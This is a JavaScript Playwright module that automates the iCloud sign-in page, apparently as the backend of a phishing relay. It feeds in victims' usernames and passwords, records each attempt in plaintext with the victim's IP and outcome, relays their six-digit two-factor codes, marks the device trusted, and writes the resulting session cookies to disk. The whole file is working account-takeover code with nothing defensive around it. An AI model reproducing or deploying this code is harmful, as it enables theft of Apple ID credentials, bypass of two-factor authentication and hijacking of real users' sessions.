const playwright = require('playwright');
const readline = require('readline');
const fs = require('fs');
const path = require('path');


let browser = null; // Shared browser instance
const userSessions = {}; // Map to store user sessions



async function saveLoginAttempt(userId, username, password, outcome) {
    const userDir = path.join(__dirname, 'Credentials', userId);
    const attemptsFile = path.join(userDir, 'attempts.txt');
    const userSession = userSessions[userId];
    const IPu = userSession.ip;
    fs.mkdirSync(userDir, { recursive: true });
    fs.appendFileSync(attemptsFile, `Username: ${username}, Password: ${password}, IP: ${IPu}, Outcome: ${outcome}\n`);
}



// Login process
async function loginWithPlaywright(userId, username, password, ip) {

    return new Promise(async (resolve, reject) => {
        try {
            const userSession = userSessions[userId];

            if (!userSession || !userSession.context || !userSession.page) {
                console.log('Session expired. Please log in again.');
                resolve(false);
                return;
            }

            const { context, page } = userSession;
            
            // Wait for the iframe to be available
            const iframeElement = await page.waitForSelector('#aid-auth-widget-iFrame', { visible: true });
            const iframe = await iframeElement.contentFrame(); // Get the content frame of the iframe

            await iframe.click('#account_name_text_field', { clickCount: 3 });  // Select all text
            await iframe.press('#account_name_text_field', 'Backspace');  
            // Wait for and fill in the username
            await iframe.waitForSelector('#account_name_text_field', { visible: true });
            await iframe.fill('#account_name_text_field', username);

            // Click the "Sign In" button inside the iframe
            await iframe.click('#sign-in');
            await iframe.check('#remember-me-label');

            // Wait for the "Continue" button to be visible and click it
            await iframe.waitForSelector('#continue-password', { visible: true });
            await iframe.click('#continue-password');

            await iframe.click('#password_text_field', { clickCount: 3 });  // Select all text
            await iframe.press('#password_text_field', 'Backspace');  

            // Wait for the password field and fill in the password
            await iframe.waitForSelector('#password_text_field', { visible: true });
            await iframe.fill('#password_text_field', password);

            // Click the "Sign In" button to submit the login form
            await iframe.click('#sign-in');

            // Wait for success or error conditions inside the iframe
            await iframe.waitForSelector('body', { visible: true });

            const successElement = iframe.locator('.verify-device');
            const errorElement = iframe.locator('#errMsg');

            try {
                // Create promises that will resolve when the elements become visible
                const successVisiblePromise = successElement.waitFor({ state: 'visible', timeout: 5000 }).then(() => true).catch(() => false);
                const errorVisiblePromise = errorElement.waitFor({ state: 'visible', timeout: 5000 }).then(() => true).catch(() => false);

                // Use Promise.race to resolve the first condition to become visible
                const result = await Promise.race([successVisiblePromise, errorVisiblePromise]);

                if (result === true) {
                    const successVisible = await successElement.isVisible();
                    const errorVisible = await errorElement.isVisible();

                    if (successVisible) {
                        console.log('Login successful!');
                        let outcome = "success";
                        saveLoginAttempt(userId, username, password, outcome);
                        resolve(true); // Login successful
                    } else if (errorVisible) {
                        console.log('Login failed.');
                        let outcome = "failure";
                        saveLoginAttempt(userId, username, password, outcome);
                        resolve(false); // Login failed
                    } else {
                        console.log('Unknown login status.');
                        let outcome = "idk";
                        saveLoginAttempt(userId, username, password, outcome);
                        resolve(false); // Unknown status
                    }
                } else {
                    console.log('Unknown login status.');
                    resolve(false); // Unknown status
                }
            } catch (error) {
                console.error('An error occurred while waiting for success or error elements:', error);
                reject('Error during login');
            }
        } catch (error) {
            console.error('Error during login', error);
            reject('Error during login'); // Handle unexpected errors
        }
    });
}


async function saveCookiesInBackground(userId, context, page) {
    try {
        await page.waitForTimeout(6000); // Wait for cookies
        const cookies = await context.cookies();

        // Adjust cookies' SameSite attribute to "Lax"
        cookies.forEach(cookie => {
            if (cookie.sameSite) {
                cookie.sameSite = 'lax'; // Update SameSite to Lax
            }
        });

        // Create directory structure
        const directoryPath = path.join(__dirname, 'Credentials', userId);
        if (!fs.existsSync(directoryPath)) {
            fs.mkdirSync(directoryPath, { recursive: true });
        }

        // Define the initial file path
        let cookiesFilePath = path.join(directoryPath, 'cookies.json');

        // Check if the file already exists
        if (fs.existsSync(cookiesFilePath)) {
            // Generate a unique file name with timestamp
            const timestamp = Date.now();
            cookiesFilePath = path.join(directoryPath, `cookies_${timestamp}.json`);
        }

        // Save cookies to the new file
        fs.writeFileSync(cookiesFilePath, JSON.stringify(cookies, null, 2));
        delete userSessions[userId];
        console.log("session gone");
    } catch (err) {
        console.error('Error saving cookies:', err);
    }
}



async function pinValidator(userId, pin) {
    return new Promise(async (resolve, reject) => {
        try {

            const userSession = userSessions[userId];


            if (!userSession || !userSession.context || !userSession.page) {
                console.log('Session expired. Please log in again.');
                resolve(false);

                return;
            }

            const { context, page } = userSession;


            const iframeElement = await page.waitForSelector('#aid-auth-widget-iFrame', { visible: true });
            const iframe = await iframeElement.contentFrame(); // Get the content frame of the iframe

            // Ensure the PIN has exactly 6 digits
            if (pin.length !== 6) {
                throw new Error('PIN must be 6 digits.');
            }

            // Wait for the input fields to be visible before filling
            await iframe.waitForSelector('.form-security-code-input', { visible: true });

            // Manually type the PIN into the corresponding input fields inside the iframe
            await iframe.locator('input[aria-label="Enter Verification Code Digit 1"]').type(pin[0]); // Type first digit
            await iframe.locator('input[aria-label="Digit 2"]').type(pin[1]); // Type second digit
            await iframe.locator('input[aria-label="Digit 3"]').type(pin[2]); // Type third digit
            await iframe.locator('input[aria-label="Digit 4"]').type(pin[3]); // Type fourth digit
            await iframe.locator('input[aria-label="Digit 5"]').type(pin[4]); // Type fifth digit
            await iframe.locator('input[aria-label="Digit 6"]').type(pin[5]); // Type sixth digit


            const successElement = iframe.locator('button.button-rounded-rectangle[type="submit"]:has-text("Trust")');
            const errorMessage = iframe.locator('span.form-message:has-text("Incorrect verification code.")');

            try {
                // Create promises that will resolve when the elements become visible
                const successVisiblePromise = successElement.waitFor({ state: 'visible', timeout: 5000 }).then(() => true).catch(() => false);
                const errorVisiblePromise = errorMessage.waitFor({ state: 'visible', timeout: 5000 }).then(() => true).catch(() => false);

                // Use Promise.race to resolve the first condition to become visible
                const result = await Promise.race([successVisiblePromise, errorVisiblePromise]);

                if (result === true) {
                    const successVisible = await successElement.isVisible();
                    const errorVisible = await errorMessage.isVisible();

                    if (successVisible) {
                        console.log('Login successful!');
                        await successElement.click();
                        saveCookiesInBackground(userId, context, page);
                        

                        resolve(true); // PIN successful
                    } else if (errorVisible) {
                        console.log('Login failed.');
                        resolve(false); // PIN failed
                    } else {
                        console.log('Unknown login status.');
                        resolve(false); // Unknown Pin status
                    }
                } else {
                    console.log('Unknown login status.');
                    resolve(false); // Unknown status
                }
            } catch (error) {
                console.error('An error occurred while waiting for Pin success or error elements:', error);
                reject('Error during Pin');
            }
        } catch (error) {
            console.error('PIN validation failed', error);
            reject(error);
        }
    });
}


// Function to retry the navigation indefinitely if it fails
async function navigateWithRetry(page, url, delay = 1000) {
    while (true) {
        try {
            console.log(`Attempting to navigate to ${url}`);
            await page.goto(url, { waitUntil: 'load' });
            return; // Success, exit the loop
        } catch (err) {
            console.error(`Error during navigation:`, err);
            console.log(`Retrying after ${delay} ms...`);
            await new Promise(resolve => setTimeout(resolve, delay)); // Delay before retry
        }
    }
}

async function startWithPlaywright(userId, ip) {
    return new Promise(async (resolve, reject) => {
        console.log("Starting session for user:", userId);

        // If there is an existing session for the user, kill it first
        if (userSessions[userId]) {
            console.log(`Terminating old session for userId ${userId}`);
            killSession(userId);  // Terminate the old session
        }

        // Launch browser if not already launched
        if (!browser) {
            browser = await playwright.chromium.launch({ headless: true }); // Set headless to true for production
        }

        // Create a new context for the user's session
        const context = await browser.newContext();
        const page = await context.newPage();

        // Store the new context and page for the user session
        userSessions[userId] = { context, page, startTime: Date.now(), ip };

        // Navigate to the login page with infinite retry logic
        try {
            await navigateWithRetry(page, 'https://www.icloud.com/', 1000);
            await page.click('ui-button.push.primary.sign-in-button >> text=Sign In');

            console.log(`New session created for userId ${userId}`);
            resolve(true);  // Resolve the promise once the session is set up
        } catch (err) {
            console.error(`Failed to navigate and click sign in for userId ${userId}:`, err);
            reject(err); // Reject the promise if navigation fails after retries
        }
    });
}




    // Function to check if a session is expired (e.g., after 10 minutes of inactivity)
function isSessionExpired(userId) {
    const session = userSessions[userId];
    if (!session) return true; // Session doesn't exist, consider it expired

    const elapsedTime = Date.now() - session.startTime;
    const sessionTimeout = 5 * 60 * 1000;  // 10 minutes timeout

    return elapsedTime > sessionTimeout;
}

// Function to kill (delete) a session
function killSession(userId) {
    const session = userSessions[userId];
    if (session) {
        session.page.close();  // Close the page before deleting the session
        session.context.close();  // Close the context if necessary
        delete userSessions[userId];  // Delete the session
        console.log(`Session for userId ${userId} terminated.`);
        return true;
    }
    return false;
}

// Function to check and remove expired sessions
function checkExpiredSessions() {
    Object.keys(userSessions).forEach(userId => {
        if (isSessionExpired(userId)) {
            killSession(userId);  // Automatically kill the expired session
        }
    });

    // If there are no active sessions, close the browser
    if (Object.keys(userSessions).length === 0 && browser) {
        console.log("No active sessions, closing the browser...");
        browser.close();
        browser = null; // Reset the browser object after closing
    }
}

// Set up an interval to check for expired sessions every 5 minutes (300000 ms)
setInterval(checkExpiredSessions, 180000); // Run the check every 5 minutes

module.exports = {
    startWithPlaywright,
    loginWithPlaywright,
    pinValidator,
  };